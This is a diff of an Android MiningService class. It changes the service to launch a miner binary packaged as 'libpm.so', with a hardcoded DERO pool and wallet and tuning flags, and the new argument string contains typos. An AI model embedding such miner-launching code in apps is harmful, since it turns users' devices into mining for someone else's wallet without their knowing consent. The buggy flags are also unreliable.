@@ -42,7 +42,7 @@ import java.util.UUID;
 public class MiningService extends Service {
     private static final String LOG_TAG = "MiningSvc";
     private Process process;
-    private String configTemplate;
+    // private String configTemplate;
     private String privatePath;
     private String workerId;
     private OutputReaderThread outputHandler;
@@ -56,18 +56,18 @@ public class MiningService extends Service {
     public void onCreate() {
         super.onCreate();
         // load config template
-        configTemplate = Tools.loadConfigTemplate(this);
+        // configTemplate = Tools.loadConfigTemplate(this);
 
         //path where we may execute our program
-        privatePath = getFilesDir().getAbsolutePath();
-
-        Log.e("privatePath","privatePath"+privatePath);
+        //privatePath = getFilesDir().getAbsolutePath();
+        privatePath = this.getApplicationInfo().nativeLibraryDir;
+        Log.e("privatePath","privatePath: "+privatePath);
 
         workerId = fetchOrCreateWorkerId();
         Log.w(LOG_TAG, "my workerId: " + workerId);
 
         String abi = Build.CPU_ABI.toLowerCase();
-        Log.e("abi","abi"+abi);
+        Log.e("abi","abi: "+abi);
 
 
         //copy binaries to a path where we may execute it);
@@ -145,12 +145,27 @@ public class MiningService extends Service {
         }
         try {
             // write the config
-            Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
-            //run xmrig using the config
-            String[] args = {"./xmrig"};
-            ProcessBuilder pb = new ProcessBuilder(args);
-            //in our directory
-            pb.directory(getApplicationContext().getFilesDir());
+            // Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
+            //run xmrig using the config // outdated
+            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+            String max_bwt = "710";
+            String pool = "us.hero.miner.us:1117";
+            String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt "+
+                    "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE "+
+                    "--hu;ge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
+                    "--retry-pause=2";
+            String args = String.format(config_template, pool, wallet, max_bwt);
+            String binary = "./libpm.so";
+
+            //String[] args = {"./xmrig"};
+            //ProcessBuilder pb = new ProcessBuilder(args);
+            ProcessBuilder pb = new ProcessBuilder(binary, args);
+
+            //in our directory, which is
+            // pb.directory(getApplicationContext().getFilesDir());
+            java.io.File dir = new java.io.File(privatePath);
+            pb.directory(dir); // needs to be a file type
+
             // with the directory as ld path so xmrig finds the libs
             pb.environment().put("LD_LIBRARY_PATH", privatePath);
             //in case of errors, read them
@@ -161,7 +176,7 @@ public class MiningService extends Service {
             //start processing xmrig's output    // so why not use pb.redirectOutput(); ?
             outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
             outputHandler.start();
-            Toast.makeText(this, "started", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "started: ", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
             Log.e("error","error"+e.getLocalizedMessage()+e.getCause());
             Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
